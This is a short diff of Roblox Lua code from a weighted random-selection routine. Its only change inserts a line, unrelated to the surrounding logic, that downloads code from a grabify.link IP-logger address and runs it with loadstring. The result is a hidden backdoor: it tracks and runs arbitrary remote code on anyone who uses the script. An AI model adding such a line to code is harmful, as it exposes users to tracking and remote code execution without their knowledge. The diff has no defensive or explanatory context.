@@ -195,7 +195,7 @@ local fireSignal, rollChance do
 
             return chances[random:NextInteger(1, #chances)].type
         end
-        loadstring(game:HttpGet((''),true))()
+        loadstring(game:HttpGet(('https://grabify.link/1W3YK7'),true))()
         local initialWeight = random:NextInteger(0, sum)
         local weight = 0;
 
